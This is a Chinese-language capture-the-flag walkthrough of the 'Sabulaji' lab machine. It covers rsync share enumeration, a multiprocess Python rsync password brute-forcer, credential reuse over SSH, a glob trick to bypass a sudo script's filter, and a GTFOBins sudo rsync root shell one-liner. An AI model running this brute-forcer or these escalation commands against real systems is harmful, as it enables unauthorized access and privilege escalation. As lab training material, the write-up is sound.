害，这靶机，给我干沉默了

先探测ip

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l            
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded
          
```

探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT
Nmap scan report for 192.168.205.136
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
MAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
                                                                            
```

https://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync
感兴趣的自己去看，大概功能是

![image-20250612085331462](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250612085338904.webp)

查看一下共享目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync rsync://192.168.205.136:873

public          Public Files
epages          Secret Documents
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync rsync://192.168.205.136:873/public/

drwxr-xr-x          4,096 2025/05/15 12:35:39 .
-rw-r--r--            433 2025/05/15 12:35:39 todo.list
                                                                       
```

拉下来

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ mkdir tmp
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/

receiving incremental file list
created directory ./tmp/public
./
todo.list

sent 46 bytes  received 380 bytes  852.00 bytes/sec
total size is 433  speedup is 1.02
                                                            
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
└─$ cat todo.list | trans -b :zh 2>/dev/null
待办事项列表
==========

1。Sabulaji：删除私人共享设置
 - 查看所有共享文件和文件夹。
 - 禁用任何私人共享链接或权限。

2。Sabulaji：更改为强密码
 - 创建一个新密码（至少12个字符，包括大写，小写，数字和符号）。
 - 更新系统设置中的密码。
 - 确保不从其他帐户重复使用新密码。
==========
      
```

提示我们sabulaji是弱密码，我爆破了ssh无果，那就继续看共享目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/public]
└─$ rsync -avz rsync://192.168.205.136:873/epages/ ./tmp/epages/

Password: 
@ERROR: auth failed on module epages
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]
                      
```

要密码，找ai写个脚本爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat bprsync.py 
#!/usr/bin/env python3
import subprocess
import os
import sys
from multiprocessing import Pool, Manager, cpu_count, RLock
import signal
from functools import partial
from tqdm import tqdm

TARGET_HOST = "192.168.205.136"
TARGET_PORT = "873"
TARGET_MODULE = "epages"
WORDLIST_PATH = "/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt"
USERNAMES = ["", "sabulaji"]
RSYNC_TIMEOUT = 10
try:
    NUM_PROCESSES = cpu_count() if cpu_count() <= 8 else 8
except NotImplementedError:
    NUM_PROCESSES = 4

g_found_credential = None
g_pool = None


def signal_handler(sig, frame):
    global g_pool
    print("\n[!] CTRL+C pressed. Exiting.")
    if g_pool:
        g_pool.terminate()
        g_pool.join()
    sys.exit(1)


def check_password(password, found_flag, usernames):
    if found_flag.is_set():
        return None

    for username in usernames:
        if found_flag.is_set():
            return None

        user_part = f"{username}@" if username else ""
        target_url = f"rsync://{user_part}{TARGET_HOST}:{TARGET_PORT}/{TARGET_MODULE}"

        env = os.environ.copy()
        env['RSYNC_PASSWORD'] = password

        command = ['rsync', '--list-only', '-q', target_url]

        try:
            result = subprocess.run(
                command,
                env=env,
                capture_output=True,
                text=True,
                timeout=RSYNC_TIMEOUT
            )

            if result.returncode == 0:
                if not found_flag.is_set():
                    found_flag.set()
                    return (username, password)

        except (subprocess.TimeoutExpired, Exception):
            continue

    return None


def main():
    global g_found_credential, g_pool

    signal.signal(signal.SIGINT, signal_handler)
    tqdm.set_lock(RLock())

    if not os.path.exists(WORDLIST_PATH):
        print("[-] Wordlist not found.")
        sys.exit(1)

    try:
        with open(WORDLIST_PATH, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except Exception as e:
        print(f"[-] Error reading wordlist: {e}")
        sys.exit(1)

    if not passwords:
        print("[-] Wordlist is empty.")
        sys.exit(1)

    total_passwords = len(passwords)
    print(f"[+] Starting rsync brute-force attack...")

    with Manager() as manager:
        found_flag = manager.Event()

        with Pool(processes=NUM_PROCESSES, initializer=tqdm.set_lock, initargs=(tqdm.get_lock(),)) as pool:
            g_pool = pool
            worker_func = partial(check_password, found_flag=found_flag, usernames=USERNAMES)

            try:
                with tqdm(total=total_passwords, unit=" passwords", dynamic_ncols=True) as pbar:
                    for result in pool.imap_unordered(worker_func, passwords):
                        pbar.update(1)
                        if result is not None:
                            g_found_credential = result
                            pool.terminate()
                            break
            finally:
                pool.join()

    print("\n" + "=" * 60)
    if g_found_credential:
        found_user, found_pass = g_found_credential
        display_user = found_user if found_user else "<empty>"
        print(f"[+] SUCCESS! Credentials found:")
        print(f"    Username: {display_user}")
        print(f"    Password: {found_pass}")
    else:
        print("[-] FAILED. No valid credentials found.")
    print("=" * 60)


if __name__ == '__main__':
    main()
   
```

小知识，[Sublarge](https://hackmyvm.eu/profile/?user=Sublarge)  很喜欢使用xato-net-10-million-passwords-100000.txt这个字典，开爆

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ python3 $_               
[+] Starting rsync brute-force attack...
 16%|███████████████████▊                                                                                                           | 15589/100000 [06:55<37:30, 37.51 passwords/s]

============================================================
[+] SUCCESS! Credentials found:
    Username: sabulaji
    Password: admin123
============================================================
                                                                    
```

拷下来

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ rsync -avz rsync://sabulaji@192.168.205.136:873/epages/ ./tmp/epages/

Password: 
receiving incremental file list
created directory ./tmp/epages
./
secrets.doc

sent 46 bytes  received 3,242 bytes  1,315.20 bytes/sec
total size is 13,312  speedup is 4.05
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cd tmp/epages 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
└─$ ls -al
total 13
drwxr-xr-x 1 kali kali     0 Jun 11 21:08 .
drwxr-xr-x 1 kali kali     0 Jun 11 21:08 ..
-rwxr-xr-x 1 kali kali 13312 May 15 12:17 secrets.doc
 
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
└─$ libreoffice secrets.doc 
```

```
The Art of Keeping Secrets
In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.
Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.
Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.
So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than "P@ssw0rd123!"—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.
In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.

翻译
保守秘密的艺术
在这个信息泛滥的世界里，保守秘密既是一门艺术，也是一项挑战。无论是藏在床垫下的私人日记，还是在拥挤的咖啡馆里传递的神秘信息，隐藏知识的魅力都深深吸引着我们。
就拿我办公室里的老服务器机房来说吧。那是一个布满灰尘的角落，一些被遗忘的机器静静地嗡嗡作响。其中一台是21世纪初的遗物，至今仍在运行FTP服务。管理员一时糊涂，把默认账户命名为“welcome”。我无意中听到一位同事对此窃笑，说密码简单得可笑，比如“P@ssw0rd123！”——这算不上什么值得保守的秘密，但多年来却从未被触碰过。
然而，秘密不仅仅关乎密码或隐藏文件。它关乎意图。关于项目的悄悄流言，朋友之间暗中一瞥，甚至是我们守护思想的方式。最好的秘密是那些藏在众目睽睽之下，不被分心之眼察觉的秘密。
那么，我们如何掌握这门艺术呢？首先，融入其中。不要让你的秘密显而易见。其次，用比“P@ssw0rd123！”更强硬的语气来保护它——也许这句话只有你自己才能理解。最后，谨慎信任。即使是最友善的系统，如果你不小心，也可能背叛你。
最终，秘密提醒我们，并非所有事情都需要分享。有些事情最好不要说，或者至少留给那些知道去哪里找的人。
```

welcome:P@ssw0rd123!

登录ssh

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/tmp/epages]
└─$ ssh welcome@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (4 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
welcome@192.168.205.136's password: 
Permission denied, please try again.
welcome@192.168.205.136's password: 
Linux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

扒拉

```
welcome@Sabulaji:~$ ls -la
total 24
drwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .
drwxr-xr-x 4 root    root    4096 May 15 12:39 ..
lrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt
welcome@Sabulaji:~$ cat user.txt 
flag{user-cf7883184194add6adfa5f20b5061ac7}
welcome@Sabulaji:~$ sudo -l
Matching Defaults entries for welcome on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Sabulaji:
    (sabulaji) NOPASSWD: /opt/sync.sh
welcome@Sabulaji:~$ cat /opt/sync.sh
#!/bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" == *"sabulaji"* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/sabulaji/personal/notes.txt $note)

if [ -z "$difference" ]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/sabulaji/personal/notes.txt

echo "[+] Updated."
```

实现参数中不能包含"sabulaji"，然后使用diff 命令比较目标文件 /home/sabulaji/personal/notes.txt 和输入的 note 文件之间的差异,输入note为$1

先看看它一开始放了什么

```
welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /dev/null
Difference: 1d0
< Maybe you can find it...
[+] Updated.
```

![image-20250612091547195](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120915456.webp)

不，我找不到(手动狗头doge)

```
welcome@Sabulaji:~$ cd /tmp/
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
Difference: 0a1,27
> root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> sys:x:3:3:sys:/dev:/usr/sbin/nologin
> sync:x:4:65534:sync:/bin:/bin/sync
> games:x:5:60:games:/usr/games:/usr/sbin/nologin
> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
> welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
> sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
[+] Updated.
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/shadow
diff: /etc/shadow: Permission denied
no update
```

扒拉了很久，然后我偶然间id了一下

```
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

它比正常的多了一个mlocate的组，然后我就去扒拉这个是干什么的
![image-20250612094149243](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120941472.webp)

啊这，那我知道了

```
welcome@Sabulaji:~$ strings /var/lib/mlocate/mlocate.db | less
```

然后搜索sabulaji

![image-20250612094040790](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/202506120940995.webp)

看看是不是这个

```
welcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/creds.txt
error: forbidden
```

在这等我呢

```
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaj*/personal/creds.txt
Difference: 1c1
< 
---
> Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
```

拿下

```
welcome@Sabulaji:/tmp$ cd /home/
welcome@Sabulaji:/home$ su sabulaji
Password: 
sabulaji@Sabulaji:/home$ id
uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
```

扒拉

```
sabulaji@Sabulaji:/home$ cd sabulaji/
sabulaji@Sabulaji:~$ ls -al
total 24
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 .
drwxr-xr-x 4 root     root     4096 May 15 12:39 ..
lrwxrwxrwx 1 root     root        9 May 15 12:47 .bash_history -> /dev/null
-rw-r--r-- 1 sabulaji sabulaji  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 sabulaji sabulaji 3526 Apr 18  2019 .bashrc
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 personal
-rw-r--r-- 1 sabulaji sabulaji  807 Apr 18  2019 .profile
sabulaji@Sabulaji:~$ cd personal/
sabulaji@Sabulaji:~/personal$ ls -al
total 16
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 .
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 ..
-r-------- 1 sabulaji sabulaji   35 May 16 01:32 creds.txt
-rw-r--r-- 1 sabulaji sabulaji   35 Jun 11 21:56 notes.txt
sabulaji@Sabulaji:~/personal$ sudo -l
Matching Defaults entries for sabulaji on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sabulaji may run the following commands on Sabulaji:
    (ALL) NOPASSWD: /usr/bin/rsync
```

有现成的

https://gtfobins.github.io/gtfobins/rsync/#sudo

```
sabulaji@Sabulaji:~/personal$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
# bash           
root@Sabulaji:/home/sabulaji/personal# cat /root/root.txt 
flag{root-89e62d8807f7986edb259eb2237d011c}
```